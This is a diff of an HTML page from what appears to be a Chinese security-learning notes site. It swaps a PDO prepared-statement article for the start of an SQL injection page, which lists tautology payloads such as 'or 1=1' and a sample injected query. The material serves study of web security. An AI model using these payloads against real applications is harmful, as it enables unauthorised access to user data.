@@ -9,21 +9,21 @@
       
       
       
-        <link rel="canonical" href="https://startr4ck.top/SQL%E6%B3%A8%E5%85%A5/PDO/">
+        <link rel="canonical" href="https://startr4ck.top/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/">
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.3">
     
     
       
-        <title>PDO - Startr4ck安全所学</title>
+        <title>sql注入 - Startr4ck安全所学</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.5143246d.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.5143246d.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.3f5d1f46.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.3f5d1f46.min.css">
         
       
     
@@ -55,7 +55,7 @@
     <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
   
     
-    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
@@ -63,7 +63,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#pdo" class="md-skip">
+        <a href="#sql" class="md-skip">
           Skip to content
         </a>
       
@@ -78,7 +78,7 @@
 
 <header class="md-header md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="Startr4ck安全所学" class="md-header__button md-logo" aria-label="Startr4ck安全所学" data-md-component="logo">
+    <a href="../../.." title="Startr4ck安全所学" class="md-header__button md-logo" aria-label="Startr4ck安全所学" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
@@ -97,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              PDO
+              sql注入
             
           </span>
         </div>
@@ -155,7 +155,7 @@
 
 
   <li class="md-tabs__item">
-    <a href="../.." class="md-tabs__link">
+    <a href="../../.." class="md-tabs__link">
       Home
     </a>
   </li>
@@ -167,7 +167,7 @@
 
 
   <li class="md-tabs__item">
-    <a href="../../About/" class="md-tabs__link">
+    <a href="../../../About/" class="md-tabs__link">
       About
     </a>
   </li>
@@ -175,8 +175,6 @@
       
         
   
-  
-    
   
 
 
@@ -189,7 +187,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-tabs__link md-tabs__link--active">
+      <a href="../../%E6%B3%A8%E5%85%A5/%E6%B3%A8%E5%85%A5/" class="md-tabs__link">
         WEB安全
       </a>
     </li>
@@ -222,7 +220,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-tabs__link">
+      <a href="../../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-tabs__link">
         域渗透
       </a>
     </li>
@@ -249,7 +247,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC1/" class="md-tabs__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC1/" class="md-tabs__link">
         靶机
       </a>
     </li>
@@ -277,7 +275,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%BC%80%E7%AF%87/" class="md-tabs__link">
+      <a href="../../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%BC%80%E7%AF%87/" class="md-tabs__link">
         经验感悟
       </a>
     </li>
@@ -315,7 +313,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Startr4ck安全所学" class="md-nav__button md-logo" aria-label="Startr4ck安全所学" data-md-component="logo">
+    <a href="../../.." title="Startr4ck安全所学" class="md-nav__button md-logo" aria-label="Startr4ck安全所学" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
@@ -334,7 +332,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         Home
       </a>
     </li>
@@ -349,7 +347,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../About/" class="md-nav__link">
+      <a href="../../../About/" class="md-nav__link">
         About
       </a>
     </li>
@@ -362,14 +360,12 @@
 
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" data-md-state="indeterminate" type="checkbox" id="__nav_3" checked>
       
       
       
@@ -390,14 +386,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" data-md-state="indeterminate" type="checkbox" id="__nav_3_1" checked>
       
       
       
@@ -446,14 +440,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3" type="checkbox" id="__nav_3_1_3" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_1_3" checked>
       
       
       
@@ -516,7 +508,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../SQL注入/mysql布尔注入.md" class="md-nav__link">
+      <a href="../../../WEB安全/SQL注入/mysql布尔注入.md" class="md-nav__link">
         布尔注入
       </a>
     </li>
@@ -624,14 +616,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_3" type="checkbox" id="__nav_3_1_3_3" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1_3_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_1_3_3" checked>
       
       
       
@@ -652,186 +642,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          PDO
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../PDO/" class="md-nav__link">
         PDO
       </a>
-      
-        
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#pdo_1" class="md-nav__link">
-    PDO的基础
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO的基础">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pdo_2" class="md-nav__link">
-    PDO的定义
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_3" class="md-nav__link">
-    PDO实现的方式
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdoorm" class="md-nav__link">
-    PDO和ORM之间的区别
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pdo_4" class="md-nav__link">
-    PDO的安全问题
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO的安全问题">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pdo_5" class="md-nav__link">
-    PDO对于安全的防护
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO对于安全的防护">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    转义特殊的字符
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    预编译
-  </a>
-  
-    <nav class="md-nav" aria-label="预编译">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    命名参数
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    占位符
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#binparam" class="md-nav__link">
-    binParam 方式进行绑定参数
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_6" class="md-nav__link">
-    PDO分为模拟预处理和非模拟预处理
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO分为模拟预处理和非模拟预处理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    主要的安全问题来源的设置
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    安全问题总结
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_7" class="md-nav__link">
-    pdo的安全方案
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#referer" class="md-nav__link">
-    referer
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -976,7 +791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-nav__link">
+      <a href="../../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-nav__link">
         约束委派
       </a>
     </li>
@@ -990,7 +805,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-nav__link">
+      <a href="../../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E5%A7%94%E6%B4%BE/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE/" class="md-nav__link">
         非约束委派
       </a>
     </li>
@@ -1000,6 +815,180 @@
           
         </ul>
       </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" data-md-state="indeterminate" type="checkbox" id="__nav_4_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_2">
+          域内提权
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="域内提权" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_2">
+          <span class="md-nav__icon md-icon"></span>
+          域内提权
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/GPP%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        GPP组策略提权
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" data-md-state="indeterminate" type="checkbox" id="__nav_4_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_3">
+          权限维持
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="权限维持" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_3">
+          <span class="md-nav__icon md-icon"></span>
+          权限维持
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../域安全/攻击手法/权限维持/GPP组策略提权.md" class="md-nav__link">
+        域权限维持
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" data-md-state="indeterminate" type="checkbox" id="__nav_4_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_4">
+          基础
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="基础" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_4">
+          <span class="md-nav__icon md-icon"></span>
+          基础
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4_1" data-md-state="indeterminate" type="checkbox" id="__nav_4_4_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_4_1">
+          网络设置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="网络设置" data-md-level="3">
+        <label class="md-nav__title" for="__nav_4_4_1">
+          <span class="md-nav__icon md-icon"></span>
+          网络设置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="/域安全/基础知识/网络转发.md" class="md-nav__link">
+        内网流量转发
+      </a>
     </li>
   
 
@@ -1085,7 +1074,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC1/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC1/" class="md-nav__link">
         DC1
       </a>
     </li>
@@ -1099,7 +1088,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC2/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC2/" class="md-nav__link">
         DC2
       </a>
     </li>
@@ -1113,7 +1102,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC3/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC3/" class="md-nav__link">
         DC3
       </a>
     </li>
@@ -1127,7 +1116,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC4/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC4/" class="md-nav__link">
         DC4
       </a>
     </li>
@@ -1141,7 +1130,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC6/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC6/" class="md-nav__link">
         DC6
       </a>
     </li>
@@ -1155,7 +1144,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC7/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC7/" class="md-nav__link">
         DC7
       </a>
     </li>
@@ -1169,7 +1158,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/DC8/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/DC8/" class="md-nav__link">
         DC8
       </a>
     </li>
@@ -1183,7 +1172,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/Djinn/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/Djinn/" class="md-nav__link">
         Djinn
       </a>
     </li>
@@ -1197,7 +1186,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/HA-wordy/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/HA-wordy/" class="md-nav__link">
         HA-wordy
       </a>
     </li>
@@ -1211,7 +1200,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/hackme/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/hackme/" class="md-nav__link">
         hackme
       </a>
     </li>
@@ -1225,7 +1214,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/inplainsight/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/inplainsight/" class="md-nav__link">
         inplainsight
       </a>
     </li>
@@ -1239,7 +1228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/Me_and_My_GirlFriend/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/Me_and_My_GirlFriend/" class="md-nav__link">
         Me_and_My_GirlFriend
       </a>
     </li>
@@ -1253,7 +1242,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/minua/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/minua/" class="md-nav__link">
         minua
       </a>
     </li>
@@ -1267,7 +1256,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/MrRobot/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/MrRobot/" class="md-nav__link">
         MrRobot
       </a>
     </li>
@@ -1281,7 +1270,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/OS-HackNotes-2.1/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/OS-HackNotes-2.1/" class="md-nav__link">
         OS-HackNotes-2.1
       </a>
     </li>
@@ -1295,7 +1284,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/sunset_1/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/sunset_1/" class="md-nav__link">
         sunset_1
       </a>
     </li>
@@ -1309,7 +1298,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/sunset_nightfall/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/sunset_nightfall/" class="md-nav__link">
         sunset_nightfall
       </a>
     </li>
@@ -1323,7 +1312,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E9%9D%B6%E6%9C%BA/unknowndevice6/" class="md-nav__link">
+      <a href="../../../%E9%9D%B6%E6%9C%BA/unknowndevice6/" class="md-nav__link">
         unknowndevice6
       </a>
     </li>
@@ -1430,7 +1419,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%BC%80%E7%AF%87/" class="md-nav__link">
+      <a href="../../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%BC%80%E7%AF%87/" class="md-nav__link">
         OSWE 介绍
       </a>
     </li>
@@ -1444,7 +1433,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%B0%BE%E7%AF%87/" class="md-nav__link">
+      <a href="../../../%E7%BB%8F%E9%AA%8C%26%26%E5%88%86%E4%BA%AB/%E8%80%83%E8%AF%81/OSWE/OSWE%E5%B0%BE%E7%AF%87/" class="md-nav__link">
         OSWE 考试方法
       </a>
     </li>
@@ -1498,143 +1487,22 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pdo_1" class="md-nav__link">
-    PDO的基础
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO的基础">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pdo_2" class="md-nav__link">
-    PDO的定义
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_3" class="md-nav__link">
-    PDO实现的方式
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdoorm" class="md-nav__link">
-    PDO和ORM之间的区别
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pdo_4" class="md-nav__link">
-    PDO的安全问题
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO的安全问题">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#pdo_5" class="md-nav__link">
-    PDO对于安全的防护
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO对于安全的防护">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    转义特殊的字符
+    基于布尔类型
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    预编译
-  </a>
-  
-    <nav class="md-nav" aria-label="预编译">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    命名参数
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    占位符
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#binparam" class="md-nav__link">
-    binParam 方式进行绑定参数
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_6" class="md-nav__link">
-    PDO分为模拟预处理和非模拟预处理
-  </a>
-  
-    <nav class="md-nav" aria-label="PDO分为模拟预处理和非模拟预处理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    主要的安全问题来源的设置
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    安全问题总结
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#pdo_7" class="md-nav__link">
-    pdo的安全方案
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#referer" class="md-nav__link">
-    referer
+  <a href="#_2" class="md-nav__link">
+    报错进行打印内容
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#orderby" class="md-nav__link">
+    orderby 注入
   </a>
   
 </li>
@@ -1652,107 +1520,152 @@
               
                 
                 
-                <h1 id="pdo">PDO</h1>
-<p>编译预处理是很多文章当中所说的防范SQL注入最好的方法了，但是其是否一定是安全的呢？这篇文章会包括以下的几个问题。 <br />
-1. 什么是PDO？
-2. PDO和ORM的不同？
-3. PDO所产生的安全问题 </p>
-<h2 id="pdo_1">PDO的基础</h2>
-<h3 id="pdo_2">PDO的定义</h3>
-<p>用我自己的话来说，PDO就是PHP官方为了统一数据库的操作以及避免SQL注入等安全问题的产生所以构建的一个数据访问框架。所以这里说的PDO一定是专门针对PHP语言。<br />
-官方的话就是如下<br />
-<code>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。 注意利用 PDO 扩展自身并不能实现任何数据库功能；必须使用一个 具体数据库的 PDO 驱动 来访问数据库服务。</code> <a href="https://www.php.net/manual/zh/intro.pdo.php">来源于php官方文档</a> <br />
-其实现的方式图示可如下<br />
-<img alt="20211017190425" src="https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017190425.png" /></p>
-<h3 id="pdo_3">PDO实现的方式</h3>
-<p><strong>操作步骤</strong><br />
-1. 创建对象<br />
-$dsn是一个数据层 $dsn = "{$type}:host={$host},$db_name={$db_name}"
-$pdo = new PDO($dsn,$user,$pass);
-调用对象方法，对错误异常进行处理<br />
-昨晚上一直插入数据不成功的原因是插入的sql语句在表名当中没有使用进行包裹<br />
-其实实例当中的数据也是没有进行包裹的但是却成功了
-2. 查询操作<br />
-$res是返回的结果集 pdo对象的query方法<br />
-fetch 查询单条<br />
-fetchAll 获取所有的记录<br />
-foreach($res as $row)
-对展示出来的结果也需要使用函数对结果集进行处理 
-fetch函数一条一条
-fetchall 函数全部进行展示<br />
--&gt;rowCount() 展示的是结果集的行数  </p>
-<ol>
-<li>模型映射&amp;&amp;链式操作<br />
-简单地来说就是申明一个类，其中的数据属性是private属性，和一个内置的get方法 我们要做的就是在pdo属性当中进行设置pdo的访问方法，然后当访问到的时候返回的就是一个对象而不是一个属性了<br />
-<img alt="20211017191612" src="https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017191612.png" /></li>
-<li>预处理<br />
-预处理的主要作用是为了防止sql注入攻击<br />
-原理 将数据和代码进行分割 ，产生sql注入的时间是在编译期间，预处理是在prepare的时候将模板进行编译了，然后再往其中送入参数数据。
-先使用pdo的prepare方法  返回一个预处理的对象<br />
-再执行预处理对象的execute方法得到结果，execute当中保存参数<br />
-<img alt="20211017191631" src="https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017191631.png" />  </li>
-</ol>
-<h3 id="pdoorm">PDO和ORM之间的区别</h3>
-<p>关于编程语言访问数据库，其实还有DAO，这里就按照自己的理解直接说明之间的区别 <br />
--  PDO：代码访问数据库的统一接口，其访问mysql，postgresql 都是用一套代码。<br />
--  DAO: 和PDO的概念很像，有点像已经将对应的sql代码封装好成函数，每一次调用函数即可，只是做到了方便，但其实DAO当中的sql函数没有处理好一样会存在sql注入的问题。<br />
-- ORM:强调的是一种思想，即将数据库当中的内容对应成为对象的思想，将操作对象的方式来操作数据，有点MVC当中model的概念。  </p>
-<h2 id="pdo_4">PDO的安全问题</h2>
-<ol>
-<li>宽字节注入   </li>
-<li>预编译设置当中的安全问题    </li>
-</ol>
-<h3 id="pdo_5">PDO对于安全的防护</h3>
-<h4 id="_1">转义特殊的字符</h4>
-<p>quote()方法,将一段字符串当中的内容进行转义  </p>
-<h4 id="_2">预编译</h4>
-<h5 id="_3">命名参数</h5>
-<p>把参数值当成一个字符串整体来进行处理，即使参数值中包含单引号，也会把单引号当成单引号字符  </p>
-<pre><code>$pdo=new PDO('mysql:host=localhost;dbname=test','root','root');
+                <h1 id="sql">sql注入</h1>
+<p>逻辑当中存在 恒真的 判断条件则会返回所有的信息  </p>
+<p>or 1=1 </p>
+<p>or 1  </p>
+<p>or "1"</p>
+<pre><code>select * from xxx where username=&quot;Bob&quot; or 1;
 </code></pre>
-<h5 id="_4">占位符</h5>
-<p>问号占位符防止注入  </p>
-<pre><code>$sql=&quot;select * from user where username=? and password=?&quot;;
